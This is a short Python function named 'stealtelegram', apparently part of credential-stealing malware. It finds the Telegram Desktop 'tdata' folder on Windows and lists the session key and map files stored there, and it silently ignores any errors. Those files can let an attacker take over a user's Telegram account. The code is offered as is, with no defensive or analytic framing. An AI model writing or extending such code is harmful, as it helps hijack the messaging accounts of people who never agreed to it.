def stealtelegram():
    telegram_data = []
    
    telegram_path = os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata')
    if os.path.exists(telegram_path):
        try:
            important_files = []
            for root, dirs, files in os.walk(telegram_path):
                for file in files:
                    if any(ext in file.lower() for ext in ['.map', '.key']):
                        src = os.path.join(root, file)
                        important_files.append({
                            'path': src,
                            'size': os.path.getsize(src)
                        })
            
            if important_files:
                telegram_data.append({
                    'source': 'Telegram Desktop',
                    'path': telegram_path,
                    'files': important_files,
                    'file_count': len(important_files)
                })
        except:
            pass
    
    return telegram_data
